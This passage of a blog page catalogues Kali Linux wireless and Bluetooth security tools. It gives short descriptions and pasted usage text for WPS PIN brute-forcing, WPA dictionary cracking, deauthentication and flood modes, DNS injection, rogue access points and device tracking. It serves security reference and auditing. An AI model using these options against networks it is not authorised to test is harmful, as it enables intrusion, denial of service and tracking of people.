<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>  usage: bully &lt;options&gt; interface
</span><span class='line'>
</span><span class='line'>  Required arguments:
</span><span class='line'>
</span><span class='line'>      interface      : Wireless interface in monitor mode (root required)
</span><span class='line'>
</span><span class='line'>      -b, --bssid macaddr    : MAC address of the target access point
</span><span class='line'>   Or
</span><span class='line'>      -e, --essid string     : Extended SSID for the access point
</span><span class='line'>
</span><span class='line'>  Optional arguments:
</span><span class='line'>
</span><span class='line'>      -c, --channel N[,N...] : Channel number of AP, or list to hop [b/g]
</span><span class='line'>      -i, --index N          : Starting pin index (7 or 8 digits)  [Auto]
</span><span class='line'>      -l, --lockwait N       : Seconds to wait if the AP locks WPS   [43]
</span><span class='line'>      -o, --outfile file     : Output file for messages          [stdout]
</span><span class='line'>      -p, --pin N            : Starting pin number (7 or 8 digits) [Auto]
</span><span class='line'>      -s, --source macaddr   : Source (hardware) MAC address      [Probe]
</span><span class='line'>      -v, --verbosity N      : Verbosity level 1-3, 1 is quietest     [3]
</span><span class='line'>      -w, --workdir path     : Location of pin/session files  [~/.bully/]
</span><span class='line'>      -5, --5ghz             : Hop on 5GHz a/n default channel list  [No]
</span><span class='line'>      -B, --bruteforce       : Bruteforce the WPS pin checksum digit [No]
</span><span class='line'>      -F, --force            : Force continue in spite of warnings   [No]
</span><span class='line'>      -S, --sequential       : Sequential pins (do not randomize)    [No]
</span><span class='line'>      -T, --test             : Test mode (do not inject any packets) [No]
</span><span class='line'>
</span><span class='line'>  Advanced arguments:
</span><span class='line'>
</span><span class='line'>      -a, --acktime N        : Deprecated/ignored                  [Auto]
</span><span class='line'>      -r, --retries N        : Resend packets N times when not acked  [2]
</span><span class='line'>      -m, --m13time N        : Deprecated/ignored                  [Auto]
</span><span class='line'>      -t, --timeout N        : Deprecated/ignored                  [Auto]
</span><span class='line'>      -1, --pin1delay M,N    : Delay M seconds every Nth nack at M5 [0,1]
</span><span class='line'>      -2, --pin2delay M,N    : Delay M seconds every Nth nack at M7 [5,1]
</span><span class='line'>      -A, --noacks           : Disable ACK check for sent packets    [No]
</span><span class='line'>      -C, --nocheck          : Skip CRC/FCS validation (performance) [No]
</span><span class='line'>      -D, --detectlock       : Detect WPS lockouts unreported by AP  [No]
</span><span class='line'>      -E, --eapfail          : EAP Failure terminate every exchange  [No]
</span><span class='line'>      -L, --lockignore       : Ignore WPS locks reported by the AP   [No]
</span><span class='line'>      -M, --m57nack          : M5/M7 timeouts treated as WSC_NACK's  [No]
</span><span class='line'>      -N, --nofcs            : Packets don't contain the FCS field [Auto]
</span><span class='line'>      -P, --probe            : Use probe request for nonbeaconing AP [No]
</span><span class='line'>      -R, --radiotap         : Assume radiotap headers are present [Auto]
</span><span class='line'>      -W, --windows7         : Masquerade as a Windows 7 registrar   [No]
</span><span class='line'>      -Z, --suppress         : Suppress packet throttling algorithm  [No]
</span><span class='line'>      -V, --version          : Print version info and exit
</span><span class='line'>      -h, --help             : Display this help information</span></code></pre></td></tr></table></div></figure>


<p><strong>cowpatty</strong></p>

<p>Implementation of an offline dictionary attack against WPA/WPA2 networks using PSK-based authentication (e.g. WPA-Personal). Many enterprise networks deploy PSK-based authentication mechanisms for WPA/WPA2 since it is much easier than establishing the necessary RADIUS, supplicant and certificate authority architecture needed for WPA-Enterprise authentication. Cowpatty can implement an accelerated attack if a precomputed PMK file is available for the SSID that is being assessed.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/cowpatty.png" title="cowpatty" alt="cowpatty"></p>

<p><strong>eapmd5pass</strong></p>

<p>EAP-MD5 is a legacy authentication mechanism that does not provide sufficient protection for user authentication credentials. Users who authenticate using EAP-MD5 subject themselves to an offline dictionary attack vulnerability. This tool reads from a live network interface in monitor-mode, or from a stored libpcap capture file, and extracts the portions of the EAP-MD5 authentication exchange. Once the challenge and response portions have been collected from this exchange, eapmd5pass will mount an offline dictionary attack against the user’s password.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/eapmd5pass.png" title="eapmd5pass" alt="eapmd5pass"></p>

<p><strong>fern-wifi-cracker</strong></p>

<p>Fern Wifi Cracker is a Wireless security auditing and attack software program written using the Python Programming Language and the Python Qt GUI library, the program is able to crack and recover WEP/WPA/WPS keys and also run other network based attacks on wireless or ethernet based networks.</p>

<p>Fern Wifi Cracker currently supports the following features:</p>

<ul>
<li><p>WEP Cracking with Fragmentation,Chop-Chop, Caffe-Latte, Hirte, ARP Request Replay or WPS attack</p></li>
<li><p>WPA/WPA2 Cracking with Dictionary or WPS based attacks</p></li>
<li><p>Automatic saving of key in database on successful crack</p></li>
<li><p>Automatic Access Point Attack System</p></li>
<li><p>Session Hijacking (Passive and Ethernet Modes)</p></li>
<li><p>Access Point MAC Address Geo Location Tracking</p></li>
<li><p>Internal MITM Engine</p></li>
<li><p>Bruteforce Attacks (HTTP,HTTPS,TELNET,FTP)</p></li>
<li><p>Update Support</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/fern-wifi-cracker.png" title="fern-wifi-cracker" alt="fern-wifi-cracker"></p>

<p><strong>genkeys</strong></p>

<p>Generates lookup file for asleap</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>genkeys 2.2 - generates lookup file for asleap. &lt;jwright@hasborg.com&gt;
</span><span class='line'>genkeys: Must supply -r -f and -n
</span><span class='line'>Usage: genkeys [options]
</span><span class='line'>
</span><span class='line'>  -r  Input dictionary file, one word per line
</span><span class='line'>  -f  Output pass+hash filename
</span><span class='line'>  -n  Output index filename
</span><span class='line'>  -h  Last 2 hash bytes to filter with (optional)</span></code></pre></td></tr></table></div></figure>


<p><strong>genpmk</strong></p>

<p>WPA-PSK precomputation attack</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/genpmk.png" title="genpmk" alt="genpmk"></p>

<p><strong>giskismet</strong></p>

<p>GISKismet is a wireless recon visualization tool to represent data gathered using Kismet in a flexible manner. GISKismet stores the information in a database so that the user can generate graphs using SQL. GISKismet currently uses SQLite for the database and GoogleEarth / KML files for graphing.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: giskismet [Options]
</span><span class='line'>
</span><span class='line'>Input File:
</span><span class='line'>       --csv &lt;csv-file&gt;             Parse the input from Kismet-devel CSV
</span><span class='line'>   -x  --xml &lt;xml-file&gt;             Parse the input from Kismet-newcore NETXML
</span><span class='line'>
</span><span class='line'>Input Filters: 
</span><span class='line'>       --bssid file | list          Filter based on BSSID     
</span><span class='line'>       --essid file | list          Filter based on ESSID 
</span><span class='line'>       --encryption file | list     Filter based on Encryption 
</span><span class='line'>       --channel file | list        Filter based on Channel
</span><span class='line'>
</span><span class='line'>file | list (list = comma separated lists(needs quotes)
</span><span class='line'>
</span><span class='line'>Kismet-newcore Options:
</span><span class='line'>   -a  --ap                         Insert only the APs
</span><span class='line'>
</span><span class='line'>Query
</span><span class='line'>   -q  --query [sql]                SQL query
</span><span class='line'>   -m  --manual [csv]               CSV output of manual SQL query
</span><span class='line'>
</span><span class='line'>   -o  --output [file]              Output filename
</span><span class='line'>   -n  --name [str]                 Name of the KML layer
</span><span class='line'>       --desc [str]                 Description of the KML layer
</span><span class='line'>
</span><span class='line'>General Options:                
</span><span class='line'>       --ignore-gps                 Import data even when GPS fields are missing
</span><span class='line'>       --database [file]            SQLite3 database name [default: wireless.dbl]
</span><span class='line'>   -d  --debug [num]                Display debug information
</span><span class='line'>   -s  --silent                     No output when adding APs
</span><span class='line'>   -v  --version                    Display version
</span><span class='line'>   -h  --help                       Display this information
</span><span class='line'>
</span><span class='line'>Send Comments to Joshua "Jabra" Abraham ( jabra@spl0it.org )</span></code></pre></td></tr></table></div></figure>


<p><strong>kismet</strong></p>

<p>Kismet is an 802.11 layer2 wireless network detector, sniffer, and intrusion detection system. Kismet will work with any wireless card which supports raw monitoring (rfmon) mode, and (with appropriate hardware) can sniff 802.11b, 802.11a, 802.11g, and 802.11n traffic. Kismet also supports plugins which allow sniffing other media such as DECT.</p>

<p>Kismet identifies networks by passively collecting packets and detecting standard named networks, detecting (and given time, decloaking) hidden networks, and infering the presence of nonbeaconing networks via data traffic.</p>

<p>Kismet supports logging to the wtapfile packet format (readable by tcpdump and ethereal) and saves detected network information as plaintext,
CSV, and XML.  kismet is capable of using any GPS supported by gpsd and
logs and plots network data.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/kismet.png" title="kismet" alt="kismet"></p>

<p><strong>mdk3</strong></p>

<p>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MDK 3.0 v6 - "Yeah, well, whatever"
</span><span class='line'>by ASPj of k2wrlz, using the osdep library from aircrack-ng
</span><span class='line'>And with lots of help from the great aircrack-ng community:
</span><span class='line'>Antragon, moongray, Ace, Zero_Chaos, Hirte, thefkboss, ducttape,
</span><span class='line'>telek0miker, Le_Vert, sorbo, Andy Green, bahathir and Dawid Gajownik
</span><span class='line'>THANK YOU!
</span><span class='line'>
</span><span class='line'>MDK is a proof-of-concept tool to exploit common IEEE 802.11 protocol weaknesses.
</span><span class='line'>IMPORTANT: It is your responsibility to make sure you have permission from the
</span><span class='line'>network owner before running MDK against it.
</span><span class='line'>
</span><span class='line'>This code is licenced under the GPLv2
</span><span class='line'>
</span><span class='line'>MDK USAGE:
</span><span class='line'>mdk3 &lt;interface&gt; &lt;test_mode&gt; [test_options]
</span><span class='line'>
</span><span class='line'>Try mdk3 --fullhelp for all test options
</span><span class='line'>Try mdk3 --help &lt;test_mode&gt; for info about one test only
</span><span class='line'>
</span><span class='line'>TEST MODES:
</span><span class='line'>b   - Beacon Flood Mode
</span><span class='line'>      Sends beacon frames to show fake APs at clients.
</span><span class='line'>      This can sometimes crash network scanners and even drivers!
</span><span class='line'>a   - Authentication DoS mode
</span><span class='line'>      Sends authentication frames to all APs found in range.
</span><span class='line'>      Too much clients freeze or reset some APs.
</span><span class='line'>p   - Basic probing and ESSID Bruteforce mode
</span><span class='line'>      Probes AP and check for answer, useful for checking if SSID has
</span><span class='line'>      been correctly decloaked or if AP is in your adaptors sending range
</span><span class='line'>      SSID Bruteforcing is also possible with this test mode.
</span><span class='line'>d   - Deauthentication / Disassociation Amok Mode
</span><span class='line'>      Kicks everybody found from AP
</span><span class='line'>m   - Michael shutdown exploitation (TKIP)
</span><span class='line'>      Cancels all traffic continuously
</span><span class='line'>x   - 802.1X tests
</span><span class='line'>w   - WIDS/WIPS Confusion
</span><span class='line'>      Confuse/Abuse Intrusion Detection and Prevention Systems
</span><span class='line'>f   - MAC filter bruteforce mode
</span><span class='line'>      This test uses a list of known client MAC Adresses and tries to
</span><span class='line'>      authenticate them to the given AP while dynamically changing
</span><span class='line'>      its response timeout for best performance. It currently works only
</span><span class='line'>      on APs who deny an open authentication request properly
</span><span class='line'>g   - WPA Downgrade test
</span><span class='line'>      deauthenticates Stations and APs sending WPA encrypted packets.
</span><span class='line'>      With this test you can check if the sysadmin will try setting his
</span><span class='line'>      network to WEP or disable encryption.</span></code></pre></td></tr></table></div></figure>


<p><strong>wifiarp</strong></p>

<p>Wifi injection ARP answering tool based on Wifitap</p>

<p><strong>wifidns</strong></p>

<p>Wifi injection DNS answering tool based on Wifitap</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# wifidns -h
</span><span class='line'>Psyco optimizer not installed, running anyway...
</span><span class='line'>INFO: did not find python gnuplot wrapper . Won't be able to plot
</span><span class='line'>INFO: Can't open /etc/ethertypes file
</span><span class='line'>Usage: wifidns -b &lt;BSSID&gt; -a &lt;IP&gt; [-o &lt;iface&gt;] [-i &lt;iface&gt;]
</span><span class='line'>                          [-s &lt;SMAC&gt;] [-t &lt;TTL&gt;] [-w &lt;WEP key&gt;]
</span><span class='line'>                          [-k &lt;key id&gt;]] [-d [-v]] [-h]
</span><span class='line'>     -b &lt;BSSID&gt;    specify BSSID for injection
</span><span class='line'>     -a &lt;IP&gt;       specify IP address for DNS answers
</span><span class='line'>     -t &lt;TTL&gt;      Set TTL (default: 64)
</span><span class='line'>     -o &lt;iface&gt;    specify interface for injection (default: ath0)
</span><span class='line'>     -i &lt;iface&gt;    specify interface for listening (default: ath0)
</span><span class='line'>     -s &lt;SMAC&gt;     specify source MAC address for injected frames
</span><span class='line'>     -w &lt;key&gt;      WEP mode and key
</span><span class='line'>     -k &lt;key id&gt;   WEP key id (default: 0)
</span><span class='line'>     -d            activate debug
</span><span class='line'>     -v            verbose debugging
</span><span class='line'>     -h            this so helpful output</span></code></pre></td></tr></table></div></figure>


<p><strong>wifi-honey</strong></p>

<p>This script creates five monitor mode interfaces, four are used as APs and the fifth is used for airodump-ng. To make things easier, rather than having five windows all this is done in a screen session which allows you to switch between screens to see what is going on. All sessions are labelled so you know which is which.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Usage: /usr/bin/wifi-honey &lt;essid&gt; &lt;channel&gt; &lt;interface&gt;
</span><span class='line'>
</span><span class='line'>Default channel is 1
</span><span class='line'>Default interface is wlan0
</span><span class='line'>
</span><span class='line'>Robin Wood &lt;robin@digininja.org&gt;
</span><span class='line'>See Security Tube Wifi Mega Primer episode 26 for more information</span></code></pre></td></tr></table></div></figure>


<p><strong>wifiping</strong></p>

<p>Wifi injection based answering tool based on Wifitap</p>

<p><strong>wifitap</strong></p>

<p>Wifitap is a proof of concept for communication over WiFi networks using traffic injection.</p>

<p>Wifitap allows any application do send and receive IP packets using 802.11 traffic capture and injection over a WiFi network simply configuring wj0, which means :</p>

<ul>
<li><p>setting an IP address consistent with target network address range</p></li>
<li><p>routing desired traffic through it</p></li>
</ul>


<p>In particular, it’s a cheap method for arbitrary packets injection in 802.11 frames without specific library.</p>

<p>In addition, it will allow one to get rid of any limitation set at access point level, such as bypassing inter-client communications prevention systems (e.g. Cisco PSPF) or reaching multiple SSID handled by the same access point.</p>

<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/wifitap.png" title="wifitap" alt="wifitap"></p>

<p><strong>wifite</strong></p>

<p>An automated wireless attack tool. To attack multiple WEP, WPA, and WPS encrypted networks in a row. This tool is customizable to be automated with only a few arguments. Wifite aims to be the &ldquo;set it and forget it&rdquo; wireless auditing tool.</p>

<p>Features</p>

<ul>
<li><p>sorts targets by signal strength (in dB); cracks closest access points first</p></li>
<li><p>automatically de-authenticates clients of hidden networks to reveal SSIDs</p></li>
<li><p>numerous filters to specify exactly what to attack (wep/wpa/both, above certain signal strengths, channels, etc)</p></li>
<li><p>customizable settings (timeouts, packets/sec, etc)</p></li>
<li><p>&ldquo;anonymous&rdquo; feature; changes MAC to a random address before attacking, then changes back when attacks are complete</p></li>
<li><p>all captured WPA handshakes are backed up to wifite.py&rsquo;s current directory</p></li>
<li><p>smart WPA de-authentication; cycles between all clients and broadcast deauths</p></li>
<li><p>stop any attack with Ctrl+C, with options to continue, move onto next target, skip to cracking, or exit</p></li>
<li><p>displays session summary at exit; shows any cracked keys</p></li>
<li><p>all passwords saved to cracked.txt</p></li>
<li><p>built-in updater: ./wifite.py -upgrade</p></li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> .;'                     `;,    
</span><span class='line'> .;'  ,;'             `;,  `;,   WiFite v2 (r85)
</span><span class='line'>.;'  ,;'  ,;'     `;,  `;,  `;,  
</span><span class='line'>::   ::   :   ( )   :   ::   ::  automated wireless auditor
</span><span class='line'>':.  ':.  ':. /_\ ,:'  ,:'  ,:'  
</span><span class='line'> ':.  ':.    /___\    ,:'  ,:'   designed for Linux
</span><span class='line'>  ':.       /_____\      ,:'     
</span><span class='line'>           /       \             
</span><span class='line'>
</span><span class='line'>   COMMANDS
</span><span class='line'>  -check &lt;file&gt; check capfile &lt;file&gt; for handshakes.
</span><span class='line'>  -cracked        display previously-cracked access points
</span><span class='line'>
</span><span class='line'>   GLOBAL
</span><span class='line'>  -all            attack all targets.              [off]
</span><span class='line'>  -i &lt;iface&gt;    wireless interface for capturing [auto]
</span><span class='line'>  -mac            anonymize mac address            [off]
</span><span class='line'>  -c &lt;channel&gt;  channel to scan for targets      [auto]
</span><span class='line'>  -e &lt;essid&gt;    target a specific access point by ssid (name)  [ask]
</span><span class='line'>  -b &lt;bssid&gt;    target a specific access point by bssid (mac)  [auto]
</span><span class='line'>  -showb          display target BSSIDs after scan               [off]
</span><span class='line'>  -pow &lt;db&gt;     attacks any targets with signal strenghth &gt; db [0]
</span><span class='line'>  -quiet          do not print list of APs during scan           [off]
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>   WPA
</span><span class='line'>  -wpa            only target WPA networks (works with -wps -wep)   [off]
</span><span class='line'>  -wpat &lt;sec&gt;       time to wait for WPA attack to complete (seconds) [500]
</span><span class='line'>  -wpadt &lt;sec&gt;      time to wait between sending deauth packets (sec) [10]
</span><span class='line'>  -strip          strip handshake using tshark or pyrit             [off]
</span><span class='line'>  -crack &lt;dic&gt;  crack WPA handshakes using &lt;dic&gt; wordlist file    [off]
</span><span class='line'>  -dict &lt;file&gt;  specify dictionary to use when cracking WPA [phpbb.txt]
</span><span class='line'>  -aircrack       verify handshake using aircrack [on]
</span><span class='line'>  -pyrit          verify handshake using pyrit    [off]
</span><span class='line'>  -tshark         verify handshake using tshark   [on]
</span><span class='line'>  -cowpatty       verify handshake using cowpatty [off]
</span><span class='line'>
</span><span class='line'>   WEP
</span><span class='line'>  -wep            only target WEP networks [off]
</span><span class='line'>  -pps &lt;num&gt;    set the number of packets per second to inject [600]
</span><span class='line'>  -wept &lt;sec&gt;   sec to wait for each attack, 0 implies endless [600]
</span><span class='line'>  -chopchop       use chopchop attack      [on]
</span><span class='line'>  -arpreplay      use arpreplay attack     [on]
</span><span class='line'>  -fragment       use fragmentation attack [on]
</span><span class='line'>  -caffelatte     use caffe-latte attack   [on]
</span><span class='line'>  -p0841          use -p0841 attack        [on]
</span><span class='line'>  -hirte          use hirte (cfrag) attack [on]
</span><span class='line'>  -nofakeauth     stop attack if fake authentication fails    [off]
</span><span class='line'>  -wepca &lt;n&gt;    start cracking when number of ivs surpass n [10000]
</span><span class='line'>  -wepsave        save a copy of .cap files to this directory [off]
</span><span class='line'>
</span><span class='line'>   WPS
</span><span class='line'>  -wps        only target WPS networks         [off]
</span><span class='line'>  -wpst &lt;sec&gt;   max wait for new retry before giving up (0: never)  [660]
</span><span class='line'>  -wpsratio &lt;per&gt;   min ratio of successful PIN attempts/total tries    [0]
</span><span class='line'>  -wpsretry &lt;num&gt;   max number of retries for same PIN before giving up [0]
</span><span class='line'>
</span><span class='line'>   EXAMPLE
</span><span class='line'>  ./wifite.py -wps -wep -c 6 -pps 600
</span><span class='line'>
</span><span class='line'> [+] quitting</span></code></pre></td></tr></table></div></figure>


<h3>Bluetooth Tools</h3>

<p><strong>bluelog</strong></p>

<p>Bluelog  is  a simple Bluetooth scanner that is designed to essentially
do just one thing, log all the discoverable devices in the area. It  is
intended  to  be  used as a site survey tool, identifying the number of
possible Bluetooth targets there are in the surrounding environment.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Bluelog (v1.1.2) by Tom Nardi "MS3FGX" (MS3FGX@gmail.com)
</span><span class='line'>----------------------------------------------------------------
</span><span class='line'>Bluelog is a Bluetooth site survey tool, designed to tell you how
</span><span class='line'>many discoverable devices there are in an area as quickly as possible.
</span><span class='line'>As the name implies, its primary function is to log discovered devices
</span><span class='line'>to file rather than to be used interactively. Bluelog could run on a
</span><span class='line'>system unattended for long periods of time to collect data.
</span><span class='line'>
</span><span class='line'>Bluelog also includes a mode called "Bluelog Live" which creates a
</span><span class='line'>webpage of the results that you can serve up with your HTTP daemon of
</span><span class='line'>choice. See the "README.LIVE" file for details.
</span><span class='line'>
</span><span class='line'>For more information, see: www.digifail.com
</span><span class='line'>
</span><span class='line'>Basic Options:
</span><span class='line'>  -i &lt;interface&gt;     Sets scanning device, default is "hci0"
</span><span class='line'>  -o &lt;filename&gt;      Sets output filename, default is "devices.log"
</span><span class='line'>  -v                 Verbose, prints discovered devices to the terminal
</span><span class='line'>  -q                 Quiet, turns off nonessential terminal outout
</span><span class='line'>  -d                 Enables daemon mode, Bluelog will run in background
</span><span class='line'>  -k                 Kill an already running Bluelog process
</span><span class='line'>  -l                 Start "Bluelog Live", default is disabled
</span><span class='line'>
</span><span class='line'>Logging Options:
</span><span class='line'>  -n                 Write device names to log, default is disabled
</span><span class='line'>  -m                 Write device manufacturer to log, default is disabled
</span><span class='line'>  -c                 Write device class to log, default is disabled
</span><span class='line'>  -f                 Use "friendly" device class, default is disabled
</span><span class='line'>  -t                 Write timestamps to log, default is disabled
</span><span class='line'>  -x                 Obfuscate discovered MACs, default is disabled
</span><span class='line'>  -e                 Encode discovered MACs with CRC32, default disabled
</span><span class='line'>  -b                 Enable BlueProPro log format, see README
</span><span class='line'>
</span><span class='line'>Advanced Options:
</span><span class='line'>  -r &lt;retries&gt;       Name resolution retries, default is 3
</span><span class='line'>  -a &lt;minutes&gt;       Amnesia, Bluelog will forget device after given time
</span><span class='line'>  -w &lt;seconds&gt;       Scanning window in seconds, see README
</span><span class='line'>  -s                 Syslog only mode, no log file. Default is disabled</span></code></pre></td></tr></table></div></figure>


<p><strong>bluemaho</strong></p>

<p>BlueMaho is GUI-shell (interface) for suite of tools for testing security of bluetooth devices. It is freeware, opensource, written on python, uses wxPyhon. It can be used for testing BT-devices for known vulnerabilities and major thing to do – testing to find unknown vulns. Also it can form nice statistics.</p>

<p>Features:</p>

<ul>
<li><p>scan for devices, show advanced info, SDP records, vendor etc</p></li>
<li><p>track devices – show where and how much times device was seen, its name changes</p></li>
<li><p>loop scan – it can scan all time, showing you online devices</p></li>
<li><p>alerts with sound if new device found</p></li>
<li><p>on_new_device – you can specify what command should it run when it founds new device</p></li>
<li><p>it can use separate dongles – one for scaning (loop scan) and one for running tools or exploits</p></li>
<li><p>send files</p></li>
<li><p>change name, class, mode, BD_ADDR of local HCI devices</p></li>
<li><p>save results in database</p></li>
<li><p>form nice statistics (uniq devices by day/hour, vendors, services etc)</p></li>
<li><p>test remote device for known vulnerabilities (see exploits for more details)</p></li>
<li><p>test remote device for unknown vulnerabilities (see tools for more details)</p></li>
<li><p>themes! you can customize it</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/kali/wifi/bluemaho.png" title="bluemaho" alt="bluemaho"></p>

<p><strong>blueranger</strong></p>

<p>BlueRanger is a simple Bash script which uses Link Quality to locate Bluetooth device radios. It sends l2cap (Bluetooth) pings to create a connection between Bluetooth interfaces, since most devices allow pings without any authentication or authorization. The higher the link quality, the closer the device (in theory).</p>

<p>Use a Bluetooth Class 1 adapter for long range location detection. Switch to a Class 3 adapter for more precise short range locating. The recision and accuracy depend on the build quality of the Bluetooth adapter, interference, and response from the remote device. Fluctuations may occur even when neither device is in motion.</p>

